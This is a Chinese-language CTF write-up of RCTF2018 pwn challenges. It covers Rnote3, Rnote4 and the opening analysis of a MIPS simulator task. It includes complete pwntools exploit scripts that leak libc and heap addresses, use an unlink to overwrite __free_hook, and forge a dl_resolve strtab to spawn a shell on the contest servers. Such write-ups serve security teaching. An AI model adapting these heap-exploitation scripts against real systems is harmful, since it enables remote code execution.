# RCTF2018 #
## PWN ##
### Rnote ###
### 1.题目分析 ###
典型的菜单题目，漏洞点位于delete_note()中，对ptr指针没有进行初始化。因此，该指针保存了之前函数对该栈地址（ebp-x018）赋值过后的值。  
存在漏洞函数如下所示：
![漏洞点](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/Rnote3/picture/1.PNG)
保护机制如下：  
![保护机制](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/Rnote3/picture/2.PNG)
### 2.漏洞利用 ###
创建堆块如下所示：

	payload = 'AAAAAA'
	ru('Exit\n')
	add_note('a',0x28,payload)
	add_note('d',0x28,payload)
	add_note('b',0x88,payload)
	add_note('c',0x88,payload)
	add_note('f',0x88,payload)
#### 2.1 泄露libc地址 ####
首先通过show\_note()函数对之后想要释放的堆块进行定位，然后调用delete\_note()函数，传入一个当前不存在的title值，此时程序遍历当前note列表，无法找到对应title的note，因此就不会对ptr指针进行更新，默认释放了之前show_note()函数对该栈地址设定的值。并且对note\_list进行清空时，i=32，note\_list[32]=0。 
 
	step 1: leak libc
	show_note('c')
	rl()
	delete_note('ccc')
	show_note('\x00')
	ru('content: ')
	top_addr = u64(rv(6).ljust(8,'\x00'))
	lg('top_addr',top_addr)
	libc.address = top_addr - 0x58 - 0x3C4B20
	lg('libc_addr',libc.address)
一个需要注意的点是，保存note结构的chunk是一个fastbin，当对该fastbin进行free后，如果该fastbin是对应fastbin链表中第一个被释放的，fd位置会被清0，而fd的位置正好保存了title值。因此查找时不应该查找原title值，应该查找'\x00'。
#### 2.2 泄露堆地址 ####
方法与lead libc相同，不同的在于，需要释放一个conten也为fastbin大小（0x30）的note。然后申请一个content大小为smallbin大小的note，将刚才释放的note结构（0x20）申请回来。再次释放一个content大小为fastbin大小（0x30）的note，此时0x30大小的fastbin空闲链表中就有2个chunk，其中第一个chunk的fd字段就为一个heap地址，并且0x20大小的fastbin空闲链表中只有一个chunk（note结构），其fd字段为0。

	step 2: leak heap_addr
	add_note('c',0x88,payload)
	
	show_note('a')
	rl()
	delete_note('ccc')
	add_note('e',0x88,payload)
	show_note('d')
	rl()
	delete_note('ccc')
	show_note('\x00')
	ru('content: ')
	heap_addr = u64(rv(6).ljust(8,'\x00')) - 0x20
	lg('heap_addr',heap_addr)
#### 2.3 触发unlink，修改free_hook为system ####
通过堆布局，使两个smallbin（content）在堆空间布局上连续。然后释放相邻的两个smallbin，并再次申请一个content大小为0x90（大于0x88即可）的note结构。覆写下一个chunk的presize和size字段，然后释放下一个chunk，出发unlink。  
之后覆写free_hook为system，成功实现利用。  
#### 3.expolit代码 ####
    from pwn import *
    from ctypes import *
    import os
    #import roputils as rop
    
    remote_addr = "rnote3.2018.teamrois.cn"
    remote_port = 7322
    
    local_addr = "127.0.0.1"
    local_port = 1807
    
    pc = "./RNote3"
    pwn_elf = ELF(pc)
    pwn_rop = rop.ROP(pc)
    
    uselibc = 2 #0 for no,1 for i386,2 for x64
    local = 0
    haslibc = 1
    atta = 0
    
    if uselibc == 2:
    	context.arch = "amd64"
    else:
    	context.arch = "i386"
    
    if uselibc ==2 and haslibc == 0:
    	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    else:
    	if uselibc == 1 and haslibc == 0:
    		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    	else:
    		libc = ELF('./libc.so.6')
    
    if local == 1:
    	if haslibc:
    		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
    	else:
    		p = process(pc)
    elif local == 0:
    	p = remote(remote_addr,remote_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    else:
    	p = remote(local_addr,local_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    
    context.log_level = True
    
    if local:
    	if atta:
    		gdb.attach(p,'b *0x555555554000+0x0000000000001109')
    		#b *0x0804887F \n 
    		#0x400b6a
    
    def ru(a):
    	return p.recvuntil(a)
    
    def sn(a):
    	p.send(a)
    
    def rl():
    	return p.recvline()
    
    def sl(a):
    	p.sendline(a)
    
    def rv(a):
    	return p.recv(a)
    
    def raddr(a,l=None):
    	if l == None:
    		return u64(rv(a).ljust(8,'\x00'))
    	else:
    		return u64(rl().strip('\n').ljust(8,'\x00'))
    
    def lg(s,addr):
    	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    
    def sa(a,b):
    	p.sendafter(a,b)
    
    def sla(a,b):
    	p.sendlineafter(a,b)
    	
    def add_note(title,size,content):
    	sl('1')
    	sla('title: ',title)
    	sla('size: ',str(size))
    	sla('content: ',content)
    
    def show_note(title):
    	sl('2')
    	sla('title: ',title)
    
    
    def edit_note(title,content):
    	sl('3')
    	sla('title: ',title)
    	sla('content: ',content)
    
    def delete_note(title):
    	sl('4')
    	sla('title: ',title)
    
    def hack():
    	raw_input()
    	payload = 'AAAAAA'
    	ru('Exit\n')
    	add_note('a',0x28,payload)
    	add_note('d',0x28,payload)
    	add_note('b',0x88,payload)
    	add_note('c',0x88,payload)
    	add_note('f',0x88,payload)
    	
    	# step 1: leak libc
    	show_note('c')
    	rl()
    	delete_note('ccc')
    	show_note('\x00')
    	ru('content: ')
    	top_addr = u64(rv(6).ljust(8,'\x00'))
    	lg('top_addr',top_addr)
    	libc.address = top_addr - 0x58 - 0x3C4B20
    	lg('libc_addr',libc.address)
    
    	# step 2: leak heap_addr
    	add_note('c',0x88,payload)
    	
    	show_note('a')
    	rl()
    	delete_note('ccc')
    	add_note('e',0x88,payload)
    	show_note('d')
    	rl()
    	delete_note('ccc')
    	show_note('\x00')
    	ru('content: ')
    	heap_addr = u64(rv(6).ljust(8,'\x00')) - 0x20
    	lg('heap_addr',heap_addr)
    
    	# step 3: unlink overwrite free_hook
    	add_note('h',0x18,'AAAAA')
    	show_note('e')
    	rl()
    	delete_note('ccc')
    	delete_note('f')
    	delete_note('b')
    	fake_fd = heap_addr + 0xc0 - 0x18
    	fake_bk = heap_addr + 0xc0 - 0x10
    	payload = p64(0) + p64(0x81) + p64(fake_fd) + p64(fake_bk)
    	payload = payload.ljust(0x80,'A')
    	payload += p64(0x80) + p64(0x90) + p64(0) + p64(0)
    	add_note('g',0x90,payload)
    	add_note('i',0x70,'AAAAA')
    	delete_note('c')
    
    	show_note('\x00')
    	rl()
    	delete_note('ccc')
    
    	free_hook = libc.symbols['__free_hook']
    	lg('free_hook',free_hook)
    	payload = p64(0x21) + p64(0x67) + p64(0x90) + p64(free_hook)
    	edit_note('g',payload)
    	#one_gadget = libc.address + 0xf02a4
    	system_addr = libc.symbols['system']
    	payload = p64(system_addr)
    	edit_note('g',payload)
    
    	add_note('aaa',0x18,'/bin/sh\0')
    	delete_note('aaa')
    	p.interactive()
    
    hack()


### Rnote4 ###
#### 1.题目分析 ####
在edit_note()函数中存在简单粗暴的堆溢出漏洞，关键在于如何利用，程序无任何能泄露地址的地方。  
存在漏洞点如下图所示
![漏洞点](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/RNote4/picture/1.PNG)  
保护机制中，No PIE，No RELRO。
#### 2.漏洞利用 ####
可以发现程序没有开启基地址随机化，并且可覆写GOT表。因此考虑采用dl_resolve改写free_got为system地址，然后调用free函数，实现利用。
#### 2.1 改写ELF文件头的dynamic节的strtab字段 ####
改写strtab字段值为一个可控的内存区域。
#### 2.2 伪造strtab ####
改写strtab中"free"字符串偏移处为"system"。
#### 2.3 改写free_got ####
改写free\_got为free\_plt+0x6，使其执行dl_resolve。
#### 3.expolit代码 ####
    from pwn import *
    from ctypes import *
    import os
    #import roputils as rop
    
    remote_addr = "rnote4.2018.teamrois.cn"
    remote_port = 6767
    local_addr = "127.0.0.1"
    local_port = 1807
    
    pc = "./RNote4"
    pwn_elf = ELF(pc)
    
    uselibc = 2 #0 for no,1 for i386,2 for x64
    local = 0
    haslibc = 0
    atta = 0
    
    if uselibc == 2:
    	context.arch = "amd64"
    else:
    	context.arch = "i386"
    
    if uselibc ==2 and haslibc == 0:
    	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    else:
    	if uselibc == 1 and haslibc == 0:
    		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    	else:
    		libc = ELF('./libc.so.6')
    
    if local == 1:
    	if haslibc:
    		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
    	else:
    		p = process(pc)
    elif local == 0:
    	p = remote(remote_addr,remote_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    else:
    	p = remote(local_addr,local_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    
    context.log_level = True
    
    if local:
    	if atta:
    		gdb.attach(p,'b *0x0000000000400A85')
    		#b *0x0804887F \n 
    		#0x400b6a
    
    def ru(a):
    	return p.recvuntil(a)
    
    def sn(a):
    	p.send(a)
    
    def rl():
    	return p.recvline()
    
    def sl(a):
    	p.sendline(a)
    
    def rv(a):
    	return p.recv(a)
    
    def raddr(a,l=None):
    	if l == None:
    		return u64(rv(a).ljust(8,'\x00'))
    	else:
    		return u64(rl().strip('\n').ljust(8,'\x00'))
    
    def lg(s,addr):
    	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    
    def sa(a,b):
    	p.sendafter(a,b)
    
    def sla(a,b):
    	p.sendlineafter(a,b)
    	
    def add_note(size,content):
    	sn('\x01')
    	sn(chr(size))
    	sn(content)
    
    def edit_note(index,size,content):
    	sn('\x02')
    	sn(chr(index))
    	sn(chr(size))
    	sn(content)
    
    def delete_note(index):
    	sn('\x03')
    	sn(chr(index))
    
    def hack():
    	raw_input()
    	dynamic_strtab = 0x0000000000601EA8
    	strtab = 0x00000000004003F8
    	str_free = 0x0000000000400457
    	str_free_offset = str_free - strtab
    
    	free_got = pwn_elf.got['free']
    	free_plt = 0x0000000000400620
    
    	lg('free_plt',free_plt)
    	lg('free_got',free_got)
    	
    	add_note(0x10,'A'*0x10)
    	add_note(0x10,'A'*0x10)
    	add_note(0x30,'A'*0x30)
    
    	payload = p64(0) + p64(0) + p64(0) + p64(0x21) + p64(0) + p64(dynamic_strtab)
    	edit_note(1,0x30,payload)
    
    	data = 0x601400
    	payload = p64(5) + p64(data)
    	edit_note(2,0x10,payload)
    
    	payload = p64(0) + p64(0) + p64(0) + p64(0x21) + p64(0) + p64(data)
    	edit_note(1,0x30,payload)
    	
    	payload = '\x00'*str_free_offset + 'system\x00'
    	edit_note(2,str_free_offset+7,payload)
    	
    	payload = p64(0) + p64(0) + p64(0) + p64(0x21) + p64(0) + p64(free_got)
    	edit_note(1,0x30,payload)
    	
    	payload = p64(free_plt+0x6)
    	edit_note(2,8,payload)
    	
    	payload = '/bin/sh\0'
    	edit_note(1,8,payload)
    	delete_note(1)
    	p.interactive()
    
    hack()


### Simulator ###
#### 1.题目分析 ####
MIPS模拟器，支持12条MIPS基本指令，提供了32个整数寄存器，以及0x1000大小的.data段和0x1000大小的.text段。其中寄存器及指令相关信息如下所示。

#### Descripion of register： ####
**zeor**  
**at**  
**v0~v1**  
**a0~a3**  
**t0~t7**  
**s0~s7**  
**t8~t9**  
**k0~k1**  
**gp**  
**sp**  
**fp**  
**ra**  
共32个寄存器。

#### Descripion of instruction： ####
#### 1.li ####
load immeadiate  
**opcode:0x21**  
operand 1: register  
operand 2: immediate  
#### 2.lw ####
load word  
**opcode:0x23**  
operand 1: register  
operand 2: register/memory_label  
#### 3.sw ####
store word  
**opcode:0x2B**  
operand 1: register  
operand 2: register  
#### 4.move ####
**opcode:0x06**  
operand 1: register  
operand 2: register  
#### 5.beq #### 
**opcode:0x04**  
operand 1: register  
operand 2: register  
operand 3: offset  
#### 6.j(jmp) ####
jmp   
**opcode:0x02**  
operand 1: offset  
#### 7.Arithmetic instructions ####  
**opcode:0x20  ins\_func:add  
opcode:0x22  ins\_func:sub  
opcode:0x24  ins\_func:and  
opcode:0x25  ins\_func:or  
opcode:0x2a  ins\_func:slt**  
operand 1: register/imm  
operand 2: register/imm  
operand 3: register/imm  
#### 8.syscall ####
**opcode:0x0c**  
function: if(v0==1) printf value of a0。  
程序漏洞点：  
1.add，sub函数存在数组下标越界  
![漏洞点1]()  
2.lw，sw函数存在数组下标越界  
![漏洞点2]()
